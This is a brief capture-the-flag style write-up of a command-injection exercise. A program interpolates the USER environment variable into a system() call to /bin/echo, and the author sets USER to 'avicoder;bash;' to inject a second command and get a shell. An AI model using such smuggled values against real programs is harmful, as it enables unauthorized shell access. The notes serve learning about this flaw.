- `USER` env variable seems fishy 
- set USER to some other variable : 
      
          export USER=avicoder
                
- Result is
    
          about to call system("/bin/echo avicoder is cool")
          
- Set the USER env variable to `avicoder;bash;`

          about to call system("/bin/echo avicoder;bash; is cool")

- Solved.
